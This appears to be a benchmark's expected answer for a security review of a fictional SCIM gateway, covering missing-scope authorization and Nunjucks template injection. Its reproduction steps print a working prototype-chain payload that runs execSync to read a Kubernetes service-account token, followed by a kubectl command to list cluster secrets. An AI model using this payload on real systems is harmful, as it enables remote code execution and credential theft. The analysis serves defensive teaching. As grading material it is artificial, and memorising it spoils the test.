# Expected Response

## System
- **Name:** OptaSync Enterprise SCIM Gateway
- **Domain:** Identity & Access Management (IAM) / B2B SaaS / Directory Sync
- **Document version analysed:** 10.0.1 (FINAL) + implementation doc 4.1.2

---

## Priority Findings

### Finding 1 — Broken Function Level Authorization: Admin Template Endpoint Accessible with Standard User Scope (Pattern 1.2 — Broken function level authorization)
**Severity:** High / Privilege Escalation
**Affected endpoint:** `POST https://api.optasync.com/api/scim/v2/Tenants/{tenant_id}/Notifications/PreviewTemplate`
**Referenced in context:** Section 4.0 (RISK-IAM-412, Pattern 1.2), Section 5.0 (Kong YAML config), HAR trace

**Summary:**
The Kong Ingress configuration (`kong-scim-ingress.yaml`, Section 5.0) configures the `template-preview-route` with the `oauth2-introspection` plugin but **omits the `required_scopes` array** for this route:
```yaml
- name: notification-worker-service
  routes:
    - name: template-preview-route
      plugins:
        - name: oauth2-introspection
          config:
            introspection_endpoint: "https://auth.optasync.com/oauth2/introspect"
            # The 'required_scopes' array is completely missing.
```
Compare with the correctly configured `get-users-route`, which specifies `required_scopes: ["scim.user.read"]`. The `template-preview-route` verifies that the token is valid but enforces no scope requirement. Any authenticated user with any valid token can invoke this endpoint, which is intended for administrators with `scim.tenant.manage` scope only.

**Evidence from HAR JWT decode:**
- Second segment: `eyJzdWIiOiJ1XzM4OTExIiwic2NvcGVzIjpbInNjaW0udXNlci5yZWFkIl0sInRlbmFudCI6InRfODgxOTIifQ`
- Decoded: `{"sub":"u_38911","scopes":["scim.user.read"],"tenant":"t_88192"}` — standard user scope only
- Request targets admin function: `POST /api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate`
- Response: `200 OK` — admin endpoint accepted the user-scoped token

---

### Finding 2 — Server-Side Template Injection: Nunjucks Prototype Chain Escape → Kubernetes Service Account JWT Exfiltration (Pattern 7.3 — SSTI)
**Severity:** Critical / Remote Code Execution / Kubernetes Cluster Compromise
**Affected endpoint:** `POST https://api.optasync.com/api/scim/v2/Tenants/{tenant_id}/Notifications/PreviewTemplate`
**Referenced in context:** Section 4.0 (Pattern 7.3), Section 6.0 (templateController.js), Section 7.0 (malicious payload), HAR trace

**Summary:**
The `previewTemplate` controller (Section 6.0) passes the attacker-supplied `html_body` string directly to `env.renderString(html_body, {...})`:
```javascript
const env = new nunjucks.Environment();
// SECURITY FLAW: autoescape is false, and no sandbox or custom loader is utilized.
const renderedOutput = env.renderString(html_body, { user: mock_user_data });
```
Nunjucks in a non-sandboxed configuration allows access to the JavaScript prototype chain. The payload (Section 7.0):
```
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token').toString()")() }}
```
The `range.constructor` accesses the JavaScript `Function` constructor via the prototype chain, allowing the attacker to construct and execute an arbitrary function body inside the template evaluation context. This function imports `child_process` and executes `cat /var/run/secrets/kubernetes.io/serviceaccount/token` on the container OS, reading the Kubernetes service account JWT.

**Evidence from HAR response:**
- `preview_html` field contains a base64url-encoded Kubernetes JWT: `eyJhbGciOiJSUzI1NiIsImtpZCI6InB1YmxpYy1rZXkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50IiwKu...`
- Decoding the JWT payload: `{"iss":"kubernetes/serviceaccount","kubernetes.io/serviceaccount/namespace":"optasync-prod","kubernetes.io/serviceaccount/secret.name":"notification-worker-token-xyz","sub":"system:serviceaccount:optasync-prod:notification-worker"}` — the `notification-worker` service account token for the `optasync-prod` namespace
- Response header `x-worker-node: ip-10-44-2-19.ec2.internal` — identifies the internal EC2 node running the worker
- The `preview_html` field contains a raw token value instead of HTML — this is the definitive indicator that SSTI evaluated OS commands instead of rendering HTML

---

## Evidence Map

| Artifact location | Finding 1 (Function Level Auth) | Finding 2 (SSTI Nunjucks) |
|---|---|---|
| Section 4.0 / RISK-IAM-412 | Kong routing configured manually, not via RBAC Terraform module | SSTI via Nunjucks without sandbox |
| Section 5.0 Kong YAML | `required_scopes` missing for template-preview-route | — |
| Section 6.0 templateController.js | — | `env.renderString(html_body, ...)` — untrusted string evaluated by template engine |
| Section 7.0 malicious payload | — | `range.constructor(...)` prototype chain escape; `execSync('cat .../serviceaccount/token')` |
| HAR JWT scopes | `scopes: ["scim.user.read"]` — not `scim.tenant.manage` | — |
| HAR response code | `200 OK` — admin endpoint accepted user token | — |
| HAR preview_html | — | Contains K8s service account JWT instead of HTML |
| HAR x-worker-node | — | `ip-10-44-2-19.ec2.internal` — internal node identified |

---

## Steps to Reproduce

### Finding 1 + 2 — Auth Bypass + SSTI (chained in one probe)

**Step 1 — Obtain a standard user token and verify scope**
Authenticate to the OptaSync self-service portal as a standard employee. Decode the JWT to confirm it contains only `scim.user.read` scope (not `scim.tenant.manage`).

**Step 2 — Verify admin endpoint rejects correct credentials baseline**
First test with a legitimate admin template payload:
```
POST https://api.optasync.com/api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1XzM4OTExIiwic2NvcGVzIjpbInNjaW0udXNlci5yZWFkIl0sInRlbmFudCI6InRfODgxOTIifQ...
Content-Type: application/json

{
  "html_body": "<html><body><h1>Welcome, {{ user.first_name }}!</h1></body></html>",
  "mock_user_data": {"first_name": "Test"}
}
```
**Vulnerable outcome:** `200 OK` with `{"status": "RENDER_SUCCESS", "preview_html": "<html><body><h1>Welcome, Test!</h1></body></html>"}` — confirms function-level auth bypass (user with `scim.user.read` accessed admin-only endpoint).
**Secure outcome:** `403 Forbidden` — `{"error": "Insufficient scope. Required: scim.tenant.manage"}`.

**Step 3 — Submit SSTI payload (HAR replay)**
```
POST https://api.optasync.com/api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1XzM4OTExIiwic2NvcGVzIjpbInNjaW0udXNlci5yZWFkIl0sInRlbmFudCI6InRfODgxOTIifQ...
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36

{
  "html_body": "{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token').toString()\")() }}",
  "mock_user_data": {}
}
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `200 OK`, `x-worker-node: ip-10-44-2-19.ec2.internal`
- Response `preview_html` field contains a base64url-encoded Kubernetes JWT starting with `eyJhbGciOiJSUzI1Ni...`
- Decode the JWT: the `sub` claim will be `system:serviceaccount:optasync-prod:notification-worker`
- The service account JWT can be used with `kubectl --token=<jwt> get secrets -n optasync-prod` to escalate within the Kubernetes cluster

**SSTI detection confirmation:** If `preview_html` contains anything other than HTML markup (e.g., a JWT string, file contents, JSON data), the template engine executed code instead of rendering a template — confirmed SSTI.

**Secure outcome:** `400 Bad Request` — `{"error": "Template compilation failed."}` — the sandbox blocked the prototype chain traversal, or the Function constructor is not accessible from within the template context.

---

## Remediation

**Finding 1 (Broken Function Level Authorization):**
1. Add `required_scopes: ["scim.tenant.manage"]` to the `template-preview-route` plugin configuration in `kong-scim-ingress.yaml`.
2. Enforce routing rule changes through the standard Terraform RBAC module (not manual configuration) to prevent accidental scope omissions — addresses RISK-IAM-412.

**Finding 2 (SSTI):**
1. Enable Nunjucks sandboxed environment: use `nunjucks.configure({ autoescape: true, throwOnUndefined: true })` and a restricted `SandboxedEnvironment` that does not expose global objects.
2. Validate `html_body` input against an allowlist of safe Nunjucks tags (e.g., only allow `{{ user.field }}` pattern). Reject any input containing `constructor`, `prototype`, `process`, `require`, `global`, or `__proto__`.
3. Execute the template rendering in a separate isolated subprocess or Worker thread with no access to the main Node.js process environment.
